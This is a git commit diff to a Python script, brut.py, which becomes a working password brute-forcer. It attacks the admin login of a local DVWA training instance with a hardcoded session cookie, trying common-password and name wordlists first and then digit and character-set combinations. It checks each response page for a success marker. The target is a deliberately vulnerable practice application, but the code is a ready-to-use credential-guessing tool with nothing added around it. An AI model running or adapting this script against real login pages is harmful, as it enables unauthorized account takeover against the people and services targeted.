42085f3f8911fbecc88c0224c33ef2cccb0ab1b6
mixasa12 <76475774+mixasa12@users.noreply.github.com>
2023-12-16 04:38:50 +0300

    brut.py

--- brut.py
+++ brut.py
@@ -2,35 +2,98 @@ import string
 from itertools import product
 from time import time
 from numpy import loadtxt
+import sys
+import re
+from bs4 import BeautifulSoup
+import requests
 
 def req(password):
     print(password)
-    return False
+    target = 'http://127.0.0.1/DVWA'
+    sec_level = 'low'
+    dvwa_user = 'admin'
+    dvwa_pass = password
+    session_id = 'kt4pp783v0lda9kp93m2te303u'
+    check_words = 'Welcome'
+    data = {
+        "username": dvwa_user,
+        "password": dvwa_pass,
+        "Login": "Login"
+    }
+    cookie = {
+        "PHPSESSID": session_id,
+        "security": sec_level
+    }
+    r = requests.get("{0}/vulnerabilities/brute/".format(target), params=data, cookies=cookie, allow_redirects=False)
+    soup = BeautifulSoup(r.text, "html.parser")
+    data = soup.findAll('div', class_='vulnerable_code_area')
+    for d in data:
+        if check_words in d.text:
+            return True
+        else:
+            return False
     
 
 def product_loop(generator):
     for p in generator:
         if req(''.join(p)):
-            print('\nPassword:', ''.join(p))
             return ''.join(p)
     return False
 
+def product_loop2(generator,na):
+    name_=str(na)
+    print(na)
+    for p in generator:
+        pa=''.join(p)
+        namee=name_+pa
+        if req(namee):
+            return pa
+        namee=name_.lower()+pa
+        if req(namee):
+            return pa
+    return False
 
-def bruteforce(max_nchar=16):
-    print('1) Comparing with most common passwords / first names')
+
+def bruteforce(u,max_nchar=16):
+    print('1')
     common_pass = loadtxt('pass1m.txt', dtype=str)
+    common_names = loadtxt('pname.txt', dtype=str)
+    i=0
     for c in common_pass:
-        print(c)
-    
-    print('2) Digits cartesian product')
-    for l in range(1, 9):
+        i+=1
+        if req(c):
+            return c
+        
+    print('2')
+    for l in range(1, 10):
         generator = product(string.digits, repeat=int(l))
         print("\t..%d digit" % l)
         p = product_loop(generator)
         if p is not False:
             return p
-
-    print('3) Digits + ASCII lowercase')
+        
+    print(3)   
+    for l in range(1, max_nchar):
+        generator = product(string.digits, repeat=int(l))
+        print("\t..%d digit" % l)
+        p = product_loop2(generator,u.capitalize())
+        if p is not False:
+            return p
+    
+    print('4')
+    for n in common_names:
+        if req(n):
+            return n
+        if req(n.lower()):
+            return n   
+        for l in range(1, max_nchar):
+            generator = product(string.digits, repeat=int(l))
+            print("\t..%d digit" % l)
+            p = product_loop2(generator,n)
+            if p is not False:
+                return p
+    
+    print('5')
     for l in range(1, max_nchar + 1):
         print("\t..%d char" % l)
         generator = product(string.digits + string.ascii_lowercase,
@@ -39,7 +102,7 @@ def bruteforce(max_nchar=16):
         if p is not False:
             return p
 
-    print('4) Digits + ASCII lower / upper + punctuation')
+    print('6')
     all_char = string.digits + string.ascii_letters + string.punctuation
     for l in range(1, max_nchar + 1):
         print("\t..%d char" % l)
@@ -49,8 +112,8 @@ def bruteforce(max_nchar=16):
             return p
 
 
-# EXAMPLE
+user = 'Admin'
 start = time()
-bruteforce() # Try with '123456' or '751345' or 'test2018'
+print(bruteforce(user)) 
 end = time()
 print('Total time: %.2f seconds' % (end - start))
